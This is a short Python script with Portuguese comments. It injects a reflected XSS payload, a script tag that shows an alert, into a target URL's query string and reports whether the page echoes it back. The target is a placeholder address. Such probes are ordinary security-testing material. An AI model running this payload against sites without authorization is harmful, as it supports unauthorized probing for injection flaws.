import requests

def xss_attack(url):
    payload = "<script>alert('Ataque XSS!');</script>"
    
    # Enviar uma solicitação para o site
    response = requests.get(url + "?input=" + payload)
    
    if payload in response.text:
        print("Vulnerabilidade XSS encontrada!")
    else:
        print("Sem vulnerabilidades XSS detectadas.")

# URL do alvo
target_url = "http://exemplo.com/pagina"  # Coloque a URL do alvo aqui
xss_attack(target_url)
